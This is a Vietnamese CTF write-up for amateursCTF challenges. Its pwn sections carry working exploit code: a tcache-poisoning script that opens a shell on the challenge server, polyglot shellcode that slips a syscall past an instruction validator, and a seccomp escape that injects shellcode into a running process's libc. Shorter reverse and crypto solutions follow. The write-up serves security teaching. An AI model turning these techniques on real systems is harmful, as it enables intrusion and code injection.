exe = ELF('./heap')
context.binary = exe
# context.log_level = 'debug'

# p = process('./heap')
p = remote('amt.rs', 37557)

# --- HELPER FUNCTIONS ---
def alloc(idx):
    p.sendlineafter(b"> ", b"0")
    p.sendlineafter(b"> ", str(idx).encode())

def free(idx):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())
    # data> 
    p.sendafter(b"data> ", data)

def view(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())
    p.recvuntil(b"data> ")
    # Đọc chính xác số byte malloc (0x67) để tránh bị trôi hoặc thiếu dữ liệu
    data = p.recv(0x67)
    return data

def trigger_check():
    # 0x43 hex = 67 decimal
    p.sendlineafter(b"> ", b"67") 

# 1. Lấy địa chỉ checkbuf
checkbuf_addr = exe.symbols['checkbuf']
log.info(f"Target checkbuf address: {hex(checkbuf_addr)}")

# 2. Alloc chunk 0
log.info("Allocating chunk 0...")
alloc(0)

# 3. Free chunk 0 -> Vào Tcache
log.info("Freeing chunk 0...")
free(0)

# 4. Leak Key (Safe Linking) từ chunk 0 đã free
# Chunk trong tcache chứa: (pos >> 12) ^ next_ptr
# Vì next_ptr = 0 -> Dữ liệu chính là (pos >> 12)
log.info("Leaking Safe Linking Key...")
leak_data = view(0)
heap_key = u64(leak_data[:8].ljust(8, b'\0')) # [:8] để cắt lấy đúng 8 byte
log.info(f"Heap Key leaked: {hex(heap_key)}")

# 5. Tính toán Fake Pointer (Tcache Poisoning)
# Pointer mã hóa = Key ^ Target_Address
fake_fd = heap_key ^ checkbuf_addr
log.info(f"Forged FD Pointer: {hex(fake_fd)}")

# 6. Ghi đè FD của chunk 0 (UAF Write)
log.info("Overwriting FD with fake pointer...")
edit(0, p64(fake_fd))

# 7. Alloc(1): Lấy chunk 0 ra khỏi Tcache
# Lúc này Tcache head sẽ trỏ tới checkbuf_addr
alloc(1)

# 8. Alloc(2): Lấy chunk tiếp theo -> Chính là checkbuf!
log.info("Allocating chunk 2 @ checkbuf...")
alloc(2)

# 9. Ghi chuỗi magic vào checkbuf
magic_string = b"ALL HAIL OUR LORD AND SAVIOR TEEMO"
log.info(f"Writing magic string: {magic_string}")
edit(2, magic_string)

# 10. Kích hoạt shell
log.info("Triggering check()... Enjoy shell!")
trigger_check()

p.interactive()
```

> Flag: `amateursCTF{what_is_a_flag?why_am_i_even_doing_this_anymore?crazy?i_was_crazy_once...}`
{: .prompt-flag }

#### Key Takeaways

Bài **Easy Heap** là một ví dụ tuyệt vời để luyện tập khai thác Heap trên các hệ thống Linux hiện đại.

*   **Kiến thức thu được:**
    1.  Hiểu về lỗi UAF (Use-After-Free) cơ bản.
    2.  Cơ chế hoạt động của Tcache (Thread Local Cache).
    3.  Cách vượt qua cơ chế bảo vệ **Safe Linking** của Glibc (Leak Key -> XOR -> Poison).
    4.  Tận dụng **No PIE** để tấn công vào các vùng nhớ tĩnh (.bss/.data).

### **Easy Shellcoding**

#### Reconnaissance

Chúng ta được cung cấp một file `chal.py`. Đây là một chương trình Python đóng vai trò là Validator và Loader.

##### Nhiệm vụ:
Bạn phải nhập vào một chuỗi **Shellcode** (mã máy dưới dạng Hex). Chương trình sẽ kiểm tra shellcode này, và nếu nó thấy "hợp lệ", nó sẽ chạy shellcode đó. Mục tiêu là chiếm quyền điều khiển hệ thống (lấy shell `/bin/sh`) để đọc file `flag`.

##### The Constraints:
Chương trình `chal.py` sử dụng thư viện **Capstone** để dịch ngược (disassemble) shellcode của bạn từ mã máy sang ngôn ngữ Assembly (32-bit) để kiểm tra.

1.  **Danh sách lệnh cho phép (Whitelist):** Chỉ được dùng các lệnh: `jmp`, `add`, `mov`, `sub`, `inc`, `dec`, `cmp`, `push`, `pop`, `int3`.
2.  **Cấm lệnh nhảy bậy:** Nếu dùng `jmp`, phải nhảy vào đúng đầu một lệnh khác (không được nhảy vào giữa thân lệnh để giấu mã).
3.  **Thiếu vắng lệnh quan trọng:** Để lấy shell, ta cần gọi Hệ điều hành (System Call). Trên 32-bit, lệnh đó là `int 0x80`. Nhưng lệnh `int` **KHÔNG** nằm trong danh sách cho phép (ngoại trừ `int3`).

##### Vấn đề nan giải:
*   Ta cần gọi `execve("/bin/sh")` để có shell.
*   Để gọi nó, ta cần lệnh `int 0x80` (hoặc `syscall`).
*   Validator cấm `int`.
*   Ta không thể tự sửa code lúc chạy (Self-Modifying Code) vì vùng nhớ bị **Read-Only** (Chỉ đọc).

=> **Làm sao để chạy một lệnh bị cấm mà Validator không phát hiện ra?**

---

#### Ý tưởng giải quyết: Mode Switching

Hãy tưởng tượng CPU giống như một người đeo kính để đọc sách.
*   **Kính 32-bit (Validator đang đeo):** Nhìn chuỗi byte `48` là lệnh `dec eax`.
*   **Kính 64-bit (CPU hiện đại):** Nhìn chuỗi byte `48` chỉ là một tiền tố (prefix) vô nghĩa.

Môi trường bài thi chạy trên Ubuntu 64-bit, nhưng chương trình được biên dịch ở dạng 32-bit. Tuy nhiên, CPU vẫn hỗ trợ cả hai chế độ.

**Chiến thuật:**
1.  Viết code giả dạng là 32-bit "ngoan hiền" để vượt qua Validator.
2.  Sử dụng lệnh đặc biệt **`ljmp` (Long Jump)** để ép CPU chuyển từ chế độ 32-bit sang 64-bit ngay khi chương trình đang chạy.
3.  Khi sang 64-bit, cách CPU đọc mã máy sẽ thay đổi. Chúng ta sẽ lợi dụng sự khác biệt này để giấu lệnh `syscall` (`0F 05`) bên trong bụng của các lệnh 32-bit hợp lệ. Kỹ thuật này gọi là **Polyglot Shellcode**.

---

#### The Exploitation

##### Bước 1: Chuẩn bị thanh ghi (Setup)
Trước khi chuyển nhà sang 64-bit, ta tận dụng môi trường 32-bit để thiết lập các tham số cho hàm `execve("/bin/sh", 0, 0)`.

*   Đẩy chuỗi `"/bin///sh"` vào Stack.
*   Lưu địa chỉ chuỗi đó vào `ebx`.
*   Xóa `ecx`, `edx` (tham số 0).
*   Quan trọng: Đặt `eax = 59`. (Trong 64-bit, 59 là mã của lệnh `execve`. Trong 32-bit là 11, nhưng ta sắp sang 64-bit nên phải dùng số 59).

##### Bước 2: Chuyển hệ (The Switch)
Lệnh `ljmp` (Long Jump) cho phép ta thay đổi **Code Segment (CS)**.
*   CS mặc định của 32-bit: `0x23`.
*   CS của 64-bit trên Linux: `0x33`.

Lệnh: `ljmp 0x33, [Địa chỉ dòng lệnh tiếp theo]`
Mã hex: `EA [Address] 33 00`.
May mắn là `jmp` (bao gồm `ljmp`) nằm trong danh sách cho phép!

##### Bước 3: Ảo ảnh Polyglot (The Illusion) - Phần khó nhất
Sau khi nhảy, CPU chạy ở 64-bit, nhưng Validator (Python) vẫn đang nhìn code dưới dạng 32-bit để kiểm tra.

Ta cần thực thi lệnh **`syscall`** (Mã máy: `0F 05`).
Nhưng nếu viết `0F 05` ra, Validator 32-bit sẽ thấy và chặn.

**Giải pháp:** Giấu `0F 05` vào bên trong một lệnh `mov` khổng lồ của 64-bit.

Hãy xem bảng so sánh dưới đây cho chuỗi byte chúng ta tạo ra:
`48 BB 90 90 90 90 3D 90 90 90 0F 05 90 90 90 90`

| Byte Hex    | Validator nhìn (32-bit)                    | CPU chạy (64-bit)                              |
| :---------- | :----------------------------------------- | :--------------------------------------------- |
| `48`        | `dec eax` (Giảm eax 1 đơn vị - Hợp lệ)     | **REX Prefix** (Vô hại, báo hiệu lệnh 64-bit)  |
| `BB`        | `mov ebx, ...` (Bắt đầu lệnh mov - Hợp lệ) | **`mov rbx, ...`** (Bắt đầu lệnh mov 64-bit)   |
| `90`...`90` | (Dữ liệu của lệnh mov 32-bit)              | (Dữ liệu rác...)                               |
| `3D`        | **`cmp eax, ...`** (Lệnh so sánh - Hợp lệ) | (...vẫn đang nằm trong bụng lệnh `mov rbx`...) |
| `90`...`90` | (Dữ liệu so sánh...)                       | (...vẫn là rác...)                             |
| `0F`        | (Byte cuối của dữ liệu so sánh - Vô hại)   | (...Byte cuối của dữ liệu rác)                 |
| **`05`**    | **`add eax, ...`** (Lệnh cộng - Hợp lệ)    | **HẾT LỆNH MOV.** CPU đọc lệnh tiếp theo.      |

Wait, chỗ `0F 05` hoạt động như sau:
1.  Ở 64-bit, lệnh `mov rbx, [8 bytes immediate]` nó "nuốt" hết 8 bytes sau nó.
2.  Chuỗi byte `90 90 90 90 3D 90 90 90` là 8 byte đó.
3.  Byte tiếp theo là `0F`. Byte sau nữa là `05`.
4.  CPU 64-bit ghép lại: **`0F 05` -> `SYSCALL`**.

Ở góc nhìn 32-bit (Validator):
1.  Nó thấy `cmp eax, ...` (Opcode `3D`). Lệnh này ăn 4 byte tiếp theo.
2.  4 byte đó là `90 90 90 0F`.
3.  Validator thấy hợp lệ.
4.  Lệnh tiếp theo bắt đầu bằng `05`. Đó là `add eax, ...`. Cũng hợp lệ.

=> **Kết quả:** Validator thấy một chuỗi lệnh vô nghĩa nhưng hợp lệ (`dec`, `mov`, `cmp`, `add`). Còn CPU 64-bit thì thấy `mov rbx` (vô nghĩa) sau đó là cú sút quyết định `syscall`.

---

#### Giải thích Code (Python)

```python
# === 1. SETUP 32-BIT ===
# Chuẩn bị mọi thứ ở chế độ 32-bit vì ta dễ viết hơn
setup = asm('''
    /* Xóa eax */
    sub eax, eax
    /* Đẩy chuỗi /bin///sh vào stack */
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp  /* ebx lưu địa chỉ chuỗi /bin/sh */
    
    /* Xóa các tham số khác */
    sub ecx, ecx
    sub edx, edx
    
    /* Quan trọng: eax = 59. Đây là số hiệu syscall execve của 64-bit */
    push 59
    pop eax
''')

# === 2. LJMP TO 64-BIT ===
# Tính toán địa chỉ đích đến để nhảy
offset_ljmp = 7
target_addr = base + header_size + len(setup) + offset_ljmp

# Câu thần chú chuyển hệ: CS = 0x33
ljmp = b'\xea' + p32(target_addr) + b'\x33\x00'

# === 3. 64-BIT ADAPTER ===
# Khi nhảy sang 64-bit, tên các thanh ghi thay đổi.
# Syscall 64-bit dùng RDI (tham số 1) và RSI (tham số 2).
# Code cũ của ta để ở EBX và ECX. Ta cần chuyển qua.
# Byte 48 89 DF: Ở 32-bit là "dec eax; mov edi, ebx".
#                Ở 64-bit là "mov rdi, rbx".
adapter = b'\x48\x89\xdf' # ebx -> rdi
adapter += b'\x48\x89\xca' # ecx -> rsi

# === 4. POLYGLOT SYSCALL ===
polyglot = b''
polyglot += b'\x48'     # 64-bit: Prefix / 32-bit: dec eax
polyglot += b'\xBB'     # 64-bit: mov rbx, imm64
polyglot += b'\x90'*4   # Padding rác

# Trick đánh lừa Validator:
polyglot += b'\x3D'     # 32-bit: cmp eax, imm32 (Lệnh này nuốt 4 byte sau)
polyglot += b'\x90'*3   # Padding rác
polyglot += b'\x0F'     # Byte cuối của cmp 32-bit / Byte đầu của SYSCALL 64-bit

polyglot += b'\x05'     # 32-bit: add eax (lệnh mới) / 64-bit: byte sau của SYSCALL
polyglot += b'\x90'*4   # Operand cho lệnh add 32-bit
```

> Flag: `amateursCTF{to_hell_and_back}`
{: .prompt-flag }

---

#### Key Takeaways
Bài này dạy chúng ta rằng:
1.  **Validator chỉ kiểm tra tĩnh:** Nó chỉ nhìn code trước khi chạy, nó không biết CPU thực sự sẽ chạy thế nào.
2.  **Kiến trúc máy tính rất linh hoạt:** Một chuỗi byte có thể là lệnh này ở chế độ này, nhưng là lệnh khác ở chế độ khác.
3.  **Tư duy Hacker:** Khi bị cấm đi cửa chính (`int 0x80`), hãy tìm cửa sổ (`ljmp` sang 64-bit) và ngụy trang (`Polyglot`) để lẻn vào.

---

### **Injection**
#### Reconnaissance

Đầu tiên, chúng ta được cung cấp mã nguồn `chal.c` và các script cấu hình môi trường (Dockerfile, run.sh). Hãy xem điều gì đang diễn ra.

##### Phân tích `chal.c`
Chương trình thực hiện các bước sau:
1.  **Đọc flag thật** từ `/tmp/flag` vào bộ nhớ (biến `flag` nằm trên Stack).
2.  **Xóa flag thật**: Nó mở lại file `/tmp/flag` và ghi đè bằng nội dung giả (`fake_flag`).
    *   => *Điều này có nghĩa là ta không thể đọc flag từ file trên đĩa được nữa. Flag chỉ còn tồn tại trong RAM (Stack) của tiến trình cha.*
3.  **Nhận input từ người dùng**: Nó hỏi kích thước và đọc một đoạn dữ liệu (ELF binary) mà ta gửi lên, lưu vào `/tmp/solve`.
4.  **Fork (Tạo tiến trình con)**:
    *   **Tiến trình Cha (Parent):** Đi vào vòng lặp vô tận `while(true) { sleep(1); }`. Lưu ý: Flag vẫn nằm trong RAM của ông bố này.
    *   **Tiến trình Con (Child):**
        *   Cài đặt **Seccomp** (Bộ lọc System Call).
        *   Thực thi file `/tmp/solve` mà ta vừa gửi lên (`execve`).

##### Môi trường Sandbox
Điều khiến bài này khó chính là cấu hình **Seccomp** trong hàm `install_seccomp`. Nó chỉ cho phép đúng 6 system call (syscall):
1.  `read` (0)
2.  `write` (1)
3.  `open` (2) - Lưu ý: Chỉ `open`, không phải `openat`.
4.  `execve` (59)
5.  `exit` (60)
6.  `exit_group` (231)

**Hậu quả:**
*   Các lệnh shell bình thường (`ls`, `cat`) sẽ chết ngay lập tức vì chúng cần nhiều syscall khác (`getdents`, `fstat`, `mmap`...).
*   Thư viện chuẩn C (`libc`) thông thường cũng không chạy được vì hàm `printf`, `fopen` cần các syscall bị cấm.
*   **Quan trọng:** Syscall `lseek` bị chặn. Điều này ngăn cản việc chúng ta đọc bộ nhớ tùy ý thông qua `/proc/pid/mem` theo cách thông thường.

#### Ý tưởng tấn công (Attack Vector)

Mục tiêu: Đọc nội dung Stack của **Tiến trình Cha**.

##### Các cách tiếp cận thất bại:
1.  **Chạy Shellcode/Binary thông thường:** Bị Seccomp giết.
2.  **Đọc `/proc/$ppid/mem`:** Để đọc mem, ta cần `lseek` đến địa chỉ hợp lệ. Nhưng `lseek` bị chặn.
3.  **Đọc `/proc/$ppid/map_files/`:** Một kỹ thuật để bypass `lseek`, nhưng trong môi trường này thư mục `/proc` có vẻ bị hạn chế hoặc mount không đầy đủ.

##### Cách tiếp cận thành công: Libc Poisoning (Đầu độc thư viện)

Ta nhận thấy trong file `run.sh`:
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /tmp
cd /tmp
/app/chal
```
File thư viện `libc.so.6` được copy vào `/tmp`. Tiến trình cha (`chal`) đang chạy và load thư viện này từ `/tmp`.
*   **Điểm yếu:** `/tmp` là thư mục mà ta (người dùng/tiến trình con) có quyền **Ghi**.
*   **Cơ chế Linux:** Khi một file thư viện (`.so`) đang được một tiến trình sử dụng, nếu ta mở file đó và ghi đè nội dung lên nó, hệ điều hành (thông qua Page Cache) có thể cập nhật thay đổi đó cho tiến trình đang chạy.

**Kịch bản tấn công:**
1.  Viết một chương trình exploit "sạch" (không dùng libc chuẩn) để lọt qua Seccomp.
2.  Chương trình này sẽ mở file `/tmp/libc.so.6`.
3.  Tìm hàm `sleep` trong file đó. (Vì bố đang gọi `sleep(1)` liên tục).
4.  Ghi đè code của hàm `sleep` bằng **Shellcode** của chúng ta.
5.  Khi bố gọi `sleep` lần tới, bố sẽ chạy Shellcode thay vì ngủ.
6.  Shellcode sẽ thực hiện: `write(stdout, stack_pointer, ...)` để in flag ra cho chúng ta.

#### Chi tiết kỹ thuật Exploit

##### Bước 1: Viết code "Nostdlib" (Không thư viện chuẩn)
Vì Seccomp quá gắt, ta không thể dùng `gcc exploit.c` bình thường. Ta phải dùng cờ `-nostdlib` và tự định nghĩa các syscall bằng Assembly.

Ví dụ hàm `my_write` thay cho `write` của C:
```c
long my_write(int fd, const void *buf, unsigned long count) {
    long ret;
    // Gọi syscall số 1 (write) trực tiếp
    asm volatile ("syscall" : "=a"(ret) : "a"(1), "D"(fd), "S"(buf), "d"(count) : "memory");
    return ret;
}
```

##### Bước 2: Tìm vị trí hàm `sleep` trong ELF
File `libc.so.6` là định dạng ELF. Ta phải parse (phân tích) nó thủ công trong code C:
1.  Đọc Header ELF.
2.  Tìm Section Header.
3.  Tìm bảng Symbol (`.dynsym`) và bảng chuỗi (`.dynstr`).
4.  Duyệt qua các symbol, so sánh tên với chuỗi "sleep".
5.  Lấy địa chỉ offset của hàm `sleep`.

##### Bước 3: Kỹ thuật NOP Sled (Cầu trượt)
Đây là phần tinh tế nhất.
*   Tiến trình cha đang ngủ (`nanosleep` syscall).
*   Khi nó tỉnh dậy, CPU sẽ quay về một địa chỉ nằm **giữa** hàm `sleep` (địa chỉ return sau syscall).
*   Nếu ta ghi đè Shellcode ngay đầu hàm `sleep`, khi cha tỉnh dậy, cha sẽ rơi vào giữa đống code của ta -> **Crash** (Segmentation Fault).

**Giải pháp:** Dùng NOP Sled.
*   **NOP** (`0x90`) là lệnh Assembly "No Operation" (Không làm gì cả, đi tiếp lệnh sau).
*   Ta ghi đè 200 byte đầu của hàm `sleep` bằng toàn `0x90`.
*   Ta đặt Shellcode ở **cuối** 200 byte đó.
*   **Kết quả:** Dù cha tỉnh dậy ở bất cứ đâu trong vùng 200 byte này, CPU sẽ trượt (slide) qua các lệnh NOP cho đến khi chạm vào Shellcode ở cuối. -> **Thành công 100%**.

##### Bước 4: Shellcode lấy Flag
Shellcode (viết bằng Assembly) sẽ làm nhiệm vụ đơn giản: In nội dung Stack ra màn hình.
```asm
mov rdi, 1          ; File descriptor 1 (stdout)
mov rsi, rsp        ; Buffer = Stack Pointer (nơi chứa flag)
mov rdx, 0x10000    ; Độ dài = 64KB (đủ lớn để bao trùm flag)
mov rax, 1          ; Syscall Write
syscall
```

#### Snippet

Đây là đoạn code quan trọng nhất trong file `solve.c`:

```c
// Compile: gcc -static -nostdlib -o solve solve.c
#include <elf.h>

#define O_RDONLY 0
#define O_WRONLY 1
#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_exit 60
#define __NR_nanosleep 35

char libc_buf[4 * 1024 * 1024]; // Buffer chứa libc

// --- Syscall Wrappers ---
void my_exit(int status) {
    asm volatile ("syscall" :: "a"(__NR_exit), "D"(status));
    while(1);
}

long my_write(int fd, const void *buf, unsigned long count) {
    long ret;
    asm volatile ("syscall" : "=a"(ret) : "a"(__NR_write), "D"(fd), "S"(buf), "d"(count) : "rcx", "r11", "memory");
    return ret;
}

long my_read(int fd, void *buf, unsigned long count) {
    long ret;
    asm volatile ("syscall" : "=a"(ret) : "a"(__NR_read), "D"(fd), "S"(buf), "d"(count) : "rcx", "r11", "memory");
    return ret;
}

long my_open(const char *filename, int flags, int mode) {
    long ret;
    asm volatile ("syscall" : "=a"(ret) : "a"(__NR_open), "D"(filename), "S"(flags), "d"(mode) : "rcx", "r11", "memory");
    return ret;
}

// --- Helpers ---
int my_strcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

int my_strlen(const char *s) {
    int len = 0;
    while (s[len]) len++;
    return len;
}

void print(const char *s) {
    my_write(1, s, my_strlen(s));
}

void print_hex(unsigned long n) {
    char buf[32];
    int i = 0;
    if (n == 0) print("0");
    else {
        while(n > 0) {
            int d = n % 16;
            buf[i++] = (d < 10) ? (d + '0') : (d - 10 + 'a');
            n /= 16;
        }
        for(int j=0; j<i; j++) {
            char c = buf[i-1-j];
            my_write(1, &c, 1);
        }
    }
}

// --- Main Exploit ---
void _start() {
    print("[*] Exploit: Libc Poisoning with NOP Sled\n");

    int fd = my_open("/tmp/libc.so.6", O_RDONLY, 0);
    if (fd < 0) { print("[-] Open failed\n"); my_exit(1); }

    long total_read = 0;
    while(total_read < sizeof(libc_buf)) {
        long r = my_read(fd, libc_buf + total_read, sizeof(libc_buf) - total_read);
        if (r <= 0) break;
        total_read += r;
    }
    
    // Parse ELF tìm sleep
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)libc_buf;
    Elf64_Shdr *shdrs = (Elf64_Shdr *)(libc_buf + ehdr->e_shoff);
    char *strtab = 0;
    Elf64_Sym *symtab = 0;
    int num_syms = 0;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_DYNSYM) {
            symtab = (Elf64_Sym *)(libc_buf + shdrs[i].sh_offset);
            num_syms = shdrs[i].sh_size / sizeof(Elf64_Sym);
            strtab = (char *)(libc_buf + shdrs[shdrs[i].sh_link].sh_offset);
            break;
        }
    }

    unsigned long sleep_offset = 0;
    unsigned long sleep_size = 0;

    for (int i = 0; i < num_syms; i++) {
        char *name = strtab + symtab[i].st_name;
        if (my_strcmp(name, "sleep") == 0) {
            sleep_offset = symtab[i].st_value;
            sleep_size = symtab[i].st_size;
            break;
        }
    }

    if (!sleep_offset) { print("[-] sleep not found\n"); my_exit(1); }

    print("[+] Sleep offset: 0x"); print_hex(sleep_offset);
    print(" | Size: 0x"); print_hex(sleep_size); print("\n");

    // --- Shellcode Construction ---
    // Nhiệm vụ: Dump stack của parent process (nơi chứa flag)
    unsigned char shellcode[] = {
        // write(1, rsp, 0x10000) - Dump 64KB từ stack stack hiện tại lên trên
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, // mov rdi, 1
        0x48, 0x89, 0xe6,                         // mov rsi, rsp
        0x48, 0xc7, 0xc2, 0x00, 0x00, 0x01, 0x00, // mov rdx, 0x10000 (64KB)
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1
        0x0f, 0x05,                               // syscall
        
        // exit(0)
        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, // mov rax, 60
        0x48, 0x31, 0xff,                         // xor rdi, rdi
        0x0f, 0x05                                // syscall
    };

    // --- NOP Sled Injection ---
    // Nếu sleep_size quá nhỏ, ta có thể ghi lấn sang hàm kế tiếp (không sao cả)
    // Ghi NOP (0x90) vào 200 bytes bắt đầu từ sleep_offset
    int patch_size = 200; 
    for (int i = 0; i < patch_size; i++) {
        libc_buf[sleep_offset + i] = 0x90;
    }

    // Đặt Shellcode vào cuối cầu trượt
    int start_shellcode = patch_size - sizeof(shellcode);
    for (int i = 0; i < sizeof(shellcode); i++) {
        libc_buf[sleep_offset + start_shellcode + i] = shellcode[i];
    }

    // Mở lại file libc để GHI ĐÈ
    // Lưu ý: Dùng O_WRONLY (1) chứ không dùng cờ tạo file mới
    int fd_out = my_open("/tmp/libc.so.6", O_WRONLY, 0);
    
    // Ghi toàn bộ buffer đã chỉnh sửa vào file
    // Linux sẽ cập nhật nội dung này vào bộ nhớ của tiến trình Cha ngay lập tức
    // nhờ cơ chế Page Cache và mmap.
    my_write(fd_out, libc_buf, total_read);
```

#### Key Takeaways

Để giải bài này, ta đã đi qua các kiến thức:
1.  **Seccomp:** Hiểu cách hệ điều hành chặn syscall và cách viết code bypass bằng assembly thuần.
2.  **Linux File System:** Hiểu rằng `/tmp/libc.so.6` có thể bị ghi đè bởi user.
3.  **ELF Parsing:** Tự phân tích cấu trúc file thực thi để tìm địa chỉ hàm.
4.  **Race Condition / Code Injection:** Lợi dụng lúc tiến trình khác đang chạy để thay đổi mã nguồn của nó (Hot patching).
5.  **NOP Sled:** Kỹ thuật kinh điển trong khai thác lỗi bộ nhớ đệm để tăng độ ổn định của exploit.

Đây là một bài học tuyệt vời về việc "Khi cửa chính (`ptrace`, `mem`) bị khóa, hãy tìm cửa sổ (`shared library injection`)".

---

## **Reverse**
### **floor-is-lava**

#### Static Analysis

Dựa trên mã nguồn C được dịch ngược từ Ghidra, chúng ta xác định được các thành phần chính của chương trình:

* **Dữ liệu đầu vào:** Chương trình yêu cầu nhập đúng **28 ký tự** (vòng lặp `while (local_28 < 0x1c)`). Các ký tự hợp lệ là `w, a, s, d`.
* **Cấu trúc dữ liệu:** * **Tọa độ (X, Y):** Lưu tại `DAT_00104050` và `DAT_00104051`. Cả hai đều được giới hạn trong khoảng  bằng toán tử `& 7` (tương đương với một lưới 8x8 bao quanh).
* **Lưới trạng thái (Current Grid):** Một mảng 8 byte tại `DAT_00104010`. Mỗi bước đi sẽ thực hiện lật bit (XOR) tại vị trí tương ứng: `grid[y] ^= (1 << x)`.


* **Điều kiện thắng:**
1. Sau 28 bước, chương trình tính toán 8 giá trị ngẫu nhiên dựa trên các seed cố định: `srand(local_24 * 0x1337 + 0xdeadbeef)`.
2. Nó so sánh từng byte trong lưới của bạn với kết quả `rand() & 0xff`.
3. Nếu khớp hoàn toàn, 28 bước đi của bạn sẽ được nén thành một seed 64-bit để giải mã Flag.


#### The Crucial Insight

Để giải bài này, ta cần thực hiện phép tính XOR giữa trạng thái ban đầu và trạng thái mục tiêu:

* **Trạng thái ban đầu ():** `[0x8b, 0xc9, 0x92, 0x08, 0xf9, 0x91, 0xd6, 0xc8]`.
* **Trạng thái mục tiêu ():** Được tính bằng cách chạy mô phỏng hàm `rand()` của C với các seed đã cho.
* **Lưới cần lật ():** .

**Phát hiện quan trọng:** Khi tính toán số lượng bit "1" (popcount) của , kết quả ra chính xác là **28**.
Vì chúng ta có đúng **28 bước đi**, điều này có nghĩa là mỗi bước đi phải lật đúng 1 bit cần thiết và **không bao giờ được dẫm lên cùng một ô hai lần**, cũng như không được dẫm vào ô không cần lật.

---

#### Algorithm

Bài toán tìm đường đi 28 bước trên lưới 8x8 với các điều kiện trên có thể được giải bằng **DFS (Depth First Search)** kết hợp với **Pruning (Cắt tỉa nhánh)**:

1. Xác định danh sách tọa độ của 28 bit cần lật trong .
2. Bắt đầu từ vị trí .
3. Tìm kiếm đường đi chỉ di chuyển qua các ô nằm trong danh sách 28 bit đó.
4. Đảm bảo mỗi ô chỉ được đi qua một lần (Visited set).

---

#### Script

```python
# !/usr/bin/env python3
import ctypes
from collections import deque
import sys

sys.setrecursionlimit(5000) 

try:
    libc = ctypes.CDLL('libc.so.6')
except OSError:
    try:
        libc = ctypes.CDLL('msvcrt')
    except OSError:
        exit(1)

encrypted_flag = [
    0xd6, 0xb2, 0x05, 0x20, 0x95, 0x5b, 0x1a, 0xbe, 0x4e, 0x70, 0x5f, 0x60, 
    0xf9, 0x74, 0x51, 0xee, 0x69, 0x56, 0x8c, 0x6a, 0xc1
]
initial_grid = bytearray([
    0x8b, 0xc9, 0x92, 0x08, 0xf9, 0x91, 0xd6, 0xc8
])
initial_x = 0
initial_y = 0

target_grid = bytearray(8)
for i in range(8):
    seed = (i * 0x1337 + 0xdeadbeef) & 0xFFFFFFFF
    libc.srand(seed)
    rand_val = libc.rand()
    target_grid[i] = rand_val & 0xFF

flip_grid = bytearray(8)
for i in range(8):
    flip_grid[i] = initial_grid[i] ^ target_grid[i]

target_squares = set()
popcount = 0
for y in range(8):
    for x in range(8):
        if (flip_grid[y] >> x) & 1:
            target_squares.add((x, y))
            popcount += 1

print(f"Total bits to flip (popcount): {popcount}")
if popcount != 28:
    print("Error! Number of bits to flip is not 28. Logic error.")
    exit(1)

moves = [
    (0, -1, 'w', 0), # w
    (-1, 0, 'a', 1), # a
    (0, 1, 's', 2),  # s
    (1, 0, 'd', 3)   # d
]

final_solution = (None, None)

def solve_dfs(x, y, steps, visited_path_set, path_s, path_n):
    global final_solution
    
    if final_solution[0] is not None:
        return

    if steps == 28:
        if visited_path_set == target_squares:
            final_solution = (path_s, path_n)
        return

    for dx, dy, char, num in moves:
        nx = (x + dx) & 7
        ny = (y + dy) & 7
        
        if (nx, ny) not in target_squares:
            continue
            
        if (nx, ny) in visited_path_set:
            continue

        visited_path_set.add((nx, ny))
        solve_dfs(nx, ny, steps + 1, visited_path_set, path_s + char, path_n + [num])
        visited_path_set.remove((nx, ny))

solve_dfs(initial_x, initial_y, 0, set(), "", [])

path_str, path_nums = final_solution

if not path_str:
    print("No path found.")
else:
    print(f"Path: {path_str}")

    seed_64bit = 0
    for move in path_nums:
        seed_64bit = (seed_64bit << 2) | move

    seed_high = (seed_64bit >> 32) & 0xFFFFFFFF
    seed_low = seed_64bit & 0xFFFFFFFF
    final_seed = (seed_high ^ seed_low)

    print(f"Seed 32-bit: {final_seed}")

    libc.srand(final_seed)
    
    flag = ""
    for i in range(len(encrypted_flag)):
        rand_byte = libc.rand() & 0xFF
        flag += chr(encrypted_flag[i] ^ rand_byte)

    {% raw %}print(f"amateursCTF{{{flag}}}"){% endraw %}
```

---

**Đường đi tìm được:** `dsddwwawddwddwwddsdddwdwdwwd`

> Flag: `amateursCTF{l4va_r3v_05f0d4ff51fb}`
{: .prompt-flag }
---

## **Crypto**
### **Triangulate**

#### Reconnaissance

Đầu tiên, ta xem xét mã nguồn `chall.py` để hiểu cơ chế hoạt động của bài toán.

##### Các tham số:
*   `flag`: Chuỗi bí mật cần tìm.
*   `m`: Một số nguyên tố lớn (`getPrime`), kích thước lớn hơn `flag` một chút. Đây là mô-đun của phép toán.
*   `a`, `c`: Các hệ số ngẫu nhiên, được dùng trong hàm sinh số ngẫu nhiên.

##### Hàm sinh số (LCG biến thể):
Bài toán sử dụng **Linear Congruential Generator (LCG)** nhưng có một chút thay đổi (twist) về số lần lặp.

```python
def lcg():
    seed = flag
    # ... khởi tạo a, c ...
    ctr = 0
    while True:
        ctr += 1
        for _ in range(ctr):
            seed = (a * seed + c) % m
        yield seed
```

**Điểm mấu chốt:**
Bình thường LCG sẽ xuất ra trạng thái sau mỗi 1 bước nhảy. Nhưng ở đây, số bước nhảy tăng dần theo biến đếm `ctr`.
*   **Output 1 ($x_1$):** `ctr = 1`. Nhảy 1 bước. Tổng số bước từ đầu: $1$.
*   **Output 2 ($x_2$):** `ctr = 2`. Nhảy thêm 2 bước. Tổng số bước từ đầu: $1 + 2 = 3$.
*   **Output 3 ($x_3$):** `ctr = 3`. Nhảy thêm 3 bước. Tổng số bước từ đầu: $1 + 2 + 3 = 6$.
